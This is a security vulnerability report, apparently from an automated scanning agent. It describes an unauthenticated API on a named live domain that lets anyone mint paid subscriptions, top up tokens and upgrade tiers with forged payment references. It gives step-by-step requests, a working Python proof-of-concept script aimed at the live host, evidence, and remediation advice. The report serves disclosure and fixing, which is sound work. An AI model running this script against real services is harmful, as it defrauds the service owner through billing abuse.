# vuln-0010 — Unauthenticated subscription minting: free activate/topup/upgrade to paid tiers on apex /v1 API

**Severity:** HIGH (CVSS 7.5)  
**Target:** https://chiefaiofficer.id  
**Endpoint:** `/v1/subscriptions/{user_id}/activate`  
**Method:** POST  
**CWE:** CWE-862  
**CVSS Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`  
**Confidence:** high  
**Fix Effort:** low  
**Finding Class:** dynamic  
**Filed by:** Disposable-Tenant Validation Agent @ 2026-10-28 02:19:36 UTC
**Proxy Evidence (exchange IDs):** 7644, 7682, 7683, 7684, 7685, 7686, 7687, 7688, 7689

## Deskripsi

The apex `https://chiefaiofficer.id/v1/*` mount of the Managed Agent Platform FastAPI performs **zero authentication** (no API key required). An anonymous internet user can mint arbitrary paid-tier subscription state — activate, top-up, or upgrade any subscription — without any payment. Demonstrated end-to-end against a **disposable test tenant created by the tester** (no production data touched): created a user, then `POST /v1/subscriptions/{user_id}/activate` (tier_1 Growth, 201), `/topup` +50,000,000 tokens (200), and `/upgrade` to tier_3 Business (100,000,000 token quota, 30-day expiry) (200) — all unauthenticated, confirmed via `GET /v1/subscriptions/{user_id}` before/after.

## Dampak

Any anonymous internet user can grant themselves (or any target user) any paid plan — including tier_3 Business (IDR 999,000/month) with 100,000,000 tokens — without paying. Combined with the already-reported phone-login account takeover (vuln-0001), this means full cross-tenant billing manipulation: free upgrades, unlimited top-ups, and tier_3 access for any registered customer, and free-tier-to-paid conversion for arbitrary new accounts. The `reference_id` fields that are supposed to come from the payment gateway are fully attacker-controlled.

## Analisis Teknis

Root cause (same as vuln-0001/0002/0005): the FastAPI "Managed Agent Platform" v0.2.0 is mounted on the apex `https://chiefaiofficer.id/v1/*` behind nginx **without the `X-API-Key` validation dependency applied**, whereas the same app on `managed-agent.chiefaiofficer.id` enforces it (401 `Invalid or missing API key`). All 84 routes — including the billing/mutation routes — are therefore reachable unauthenticated on the apex. The `ActivateRequest`, `TopUpRequest`, and `UpgradeRequest` schemas are fully attacker-controlled JSON bodies (`plan_code`, `tokens`, `reference_id`) with no server-side payment-gateway signature or receipt verification, so the subscription lifecycle is driven entirely by client input. Plans are enumerable via the public `GET /v1/subscriptions/plans` endpoint (trial / tier_1 Growth IDR 299,000 / tier_3 Business IDR 999,000).

## Proof of Concept — Langkah

1. Baseline: `GET /v1/subscriptions/plans` (unauth, 200) — enumerate plan codes.
2. Create a disposable user: `POST /v1/users` with body `{email, password, external_id}` — no `X-API-Key` header at all — returns 201 with a fresh `id`.
3. Baseline state: `GET /v1/subscriptions/{user_id}` — 404 `"User tidak memiliki subscription aktif"`.
4. `POST /v1/subscriptions/{user_id}/activate` with `{"plan_code":"tier_1"}` (no key) — 201, subscription `active`, 10,000,000 token quota, 30-day expiry.
5. `POST /v1/subscriptions/{user_id}/topup` with `{"tokens":50000000,"reference_id":"scan-test-1"}` (no key) — 200, quota 10M→60M.
6. `POST /v1/subscriptions/{user_id}/upgrade` with `{"plan_code":"tier_3","reference_id":"scan-upg-1"}` (no key) — 200, now tier_3 Business, 100,000,000 token quota.
7. Confirm final state: `GET /v1/subscriptions/{user_id}` — tier_3 active.
8. No payment was made at any step; the `reference_id` values were fabricated strings.

## Proof of Concept — Script


```python
import requests

BASE = "https://chiefaiofficer.id"
S = requests.Session()
S.headers["Content-Type"] = "application/json"

# disposable test tenant (never a real customer)
r = S.post(BASE + "/v1/users", json={
    "email": "testscan.disposable.validation@example.com",
    "password": "ScanTest-2026-ValidPass",
    "full_name": "ScanTest Disposable Validation",
    "external_id": "6289911002233",
})
uid = r.json()["id"]; assert r.status_code == 201

print(S.post(f"{BASE}/v1/subscriptions/{uid}/activate",
             json={"plan_code": "tier_1"}).status_code)          # 201
print(S.post(f"{BASE}/v1/subscriptions/{uid}/topup",
             json={"tokens": 50_000_000,
                   "reference_id": "scan-test-FORGED"}).status_code)  # 200
print(S.post(f"{BASE}/v1/subscriptions/{uid}/upgrade",
             json={"plan_code": "tier_3",
                   "reference_id": "scan-upg-FORGED"}).status_code)   # 200

print(S.get(f"{BASE}/v1/subscriptions/{uid}").json())
# plan_code: tier_3, plan_label: Business, token_quota: 100000000, status active
```

## Bukti

Proxy exchanges (all unauthenticated, no X-API-Key on any request): `7682` POST /v1/users → 201 (user created, `id=626b0f10-...`); `7683` GET /v1/subscriptions/{uid} → 404 `"User tidak memiliki subscription aktif"`; `7684` POST /activate → 201 `{"plan_code":"tier_1","plan_label":"Growth","subscription_status":"active","token_quota":10000000,"expires_at":"2026-11-27..."}`; `7685` GET sub → 200 active tier_1; `7686` POST /topup → 200 `{"tokens_added":50000000,"token_quota_before":10000000,"token_quota_after":60000000}`; `7688` POST /upgrade → 200 `{"previous_plan":"tier_1","new_plan":"tier_3","token_quota":100000000}`; `7689` GET sub → 200 `{"plan_code":"tier_3","plan_label":"Business","token_quota":100000000,"subscription_status":"active"}`. Plans enumerated via `7644` GET /v1/subscriptions/plans (200, pricing IDR 299,000 / 999,000). No payment event of any kind was made.

## Asumsi

All requests were made with no credentials (no X-API-Key, no session). The tenant used for the PoC is a disposable account created for this scan (`626b0f10-2c38-417f-a7ed-0d963988d3c0`, clearly-marked test email `testscan.disposable.validation@example.com`); no production customer data was modified. The user row and its subscription remain as residual test state (no user-delete endpoint exists); the disposable agent created alongside was deleted (204).

## Counterevidence

Searched for a hidden second factor / payment verification: no OTP or signature check appears anywhere on the activate/topup/upgrade paths — fabricated `reference_id` strings (`scan-test-FORGED`) were accepted verbatim and persisted in the subscription object. No rate limit, WAF, or auth dependency intercepted any request (all unauth requests reached the business logic; 404 vs 200 differentials on the read endpoints confirm actual handling). Managed-agent vhost control: same endpoints there return 401 without a key, confirming the auth dependency exists in the app but is absent from the apex mount. `limit=500` returns 422 (max 100), so the app is reachable and validated but simply does not authenticate. The only mitigation found: none — this is fully exploitable by any anonymous internet user.

**Confidence rationale:** Working end-to-end PoC against the live target: created tenant, activated, topped up, and upgraded to tier_3 with zero credentials and zero payment, with before/after state captured via the API and recorded in the proxy. No production data was touched.

## Kondisi Perubahan Severity

None — this is fully demonstrated with a working PoC. If the apex mount is restricted or receipt verification is added, this report's severity drops accordingly.

## Rekomendasi Perbaikan

Remove the unauthenticated `/v1/*` mount from the apex nginx configuration (serve only static SPA assets there), or apply the same `X-API-Key` validation dependency the `managed-agent` vhost already enforces. Require server-side verification of payment-gateway receipts on all billing-mutation endpoints: resolve the subscription state from Midtrans transaction status (via Midtrans API/status endpoint using the server-side key) rather than accepting `plan_code`/`tokens`/`reference_id` from the request body. Enforce idempotency and uniqueness on `reference_id` server-side.
